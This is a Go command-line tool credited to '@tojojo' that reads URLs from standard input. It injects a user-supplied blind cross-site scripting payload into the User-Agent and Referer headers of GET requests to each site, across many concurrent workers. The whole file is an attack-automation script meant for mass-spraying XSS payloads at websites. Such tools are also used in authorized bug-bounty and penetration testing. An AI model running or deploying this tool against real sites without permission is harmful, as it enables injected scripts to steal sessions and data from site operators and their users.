package main 

import (
"fmt"
"flag"
"sync"
"time"
"bufio"
"os"
"net/http"
)

const (
	BannerColor  = "\033[1;34m%s\033[0m\033[1;36m%s\033[0m"
	TextColor = "\033[1;0m%s\033[1;32m%s\n\033[0m"
        InfoColor    = "\033[1;0m%s\033[1;35m%s\033[0m"
        NoticeColor  = "\033[1;0m%s\033[1;34m%s\n\033[0m"


)

func main () {

	var c int
	var p string

	flag.IntVar(&c, "C", 30, "Set the Concurrency")
	flag.StringVar(&p, "p", "", "The Blind XSS Payload")
	
	flag.Parse()
	fmt.Printf(BannerColor,`

	==================================================
	=      ====        ==   ==   ===      ====      ==
	=  ===  ===  =========  ==  ===  ====  ==  ====  =
	=  ====  ==  =========  ==  ===  ====  ==  ====  =
	=  ===  ===  ==========    =====  ========  ======
	=      ====      =======  ========  ========  ====
	=  ===  ===  ==========    =========  ========  ==
	=  ====  ==  =========  ==  ===  ====  ==  ====  =
	=  ===  ===  =========  ==  ===  ====  ==  ====  =
	=      ====  ========  ====  ===      ====      ==
	==================================================
                    
	`, "-- Coded by @tojojo -- \n")
	if p == ""{
		fmt.Printf("Some Argument are not set")
		return
	}else {
		var wg sync.WaitGroup
		for i:=0; i<c; i++ {
			wg.Add(1)
			go func () {
				agentBxss(p)
				refBxss(p)
				wg.Done()
			}()
			wg.Wait()
		}
	}
}

func agentBxss(payload string ){
	header:= "User-Agent"
	time.Sleep(500 * time.Millisecond)
	scanner:=bufio.NewScanner(os.Stdin)
	client:=&http.Client{}
	for scanner.Scan(){
		link:=scanner.Text()
		fmt.Printf(InfoColor ,"[+] Testing url:",link)
		fmt.Printf(NoticeColor , "[+] Testing field:",header )
		fmt.Printf(TextColor,"[+] Testing payload:",payload )
		req,err:=http.NewRequest("GET", link, nil)
		if err !=nil{
		return
		}
		req.Header.Add(header, payload)
		client.Do(req)
		 
    }
	
}
func refBxss(payload string ){
	header:= "Referer"
	time.Sleep(500 * time.Millisecond)
	scanner:=bufio.NewScanner(os.Stdin)
	client:=&http.Client{}
	for scanner.Scan(){
		link:=scanner.Text()
		fmt.Printf(InfoColor, "[+] Testing url:" , link , "For Blind XSS")
		fmt.Printf(NoticeColor, "[+] Testing field:",header )
		fmt.Printf(TextColor, "[+] Testing payload:",payload )
		req,err:=http.NewRequest("GET", link, nil)
		if err !=nil{
		return
		}
		req.Header.Add(header, payload)
		client.Do(req)
	}
}
	

